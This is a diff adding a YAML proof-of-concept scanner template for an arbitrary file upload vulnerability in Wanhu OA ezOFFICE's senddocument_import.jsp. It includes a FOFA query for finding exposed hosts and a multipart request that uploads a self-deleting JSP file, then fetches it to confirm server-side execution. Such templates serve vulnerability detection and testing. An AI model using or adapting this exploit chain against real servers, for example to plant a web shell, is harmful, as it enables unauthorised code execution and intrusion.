@@ -1,0 +1,48 @@
+id: poc-yaml-wan-hu-oa-senddocument-import-jsp-anyfile-upload
+info:
+  name: 万户OA senddocument_import.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----dzod41f2gyretapdhvzi
+  data: '------dzod41f2gyretapdhvzi
+
+    Content-Disposition: form-data; name="photo"; filename="{{.t1}}.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <%out.println("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------dzod41f2gyretapdhvzi
+
+    Content-Disposition: form-data; name="continueUpload"
+
+
+    0
+
+    ------dzod41f2gyretapdhvzi
+
+    Content-Disposition: form-data; name="submit"
+
+
+    导 入
+
+    ------dzod41f2gyretapdhvzi--'
+  expression: status_code == 200 && contains(body,"saveName=") && contains(body,"导入")
+  output:
+  - regex_match(body,`saveName="(?P<saveName>\d+)`)
+- method: GET
+  path: /defaultroot/upload/loginpage/{{.saveName}}.jsp;
+  expression: status_code == 200 && contains(body,t2)
+transport: http
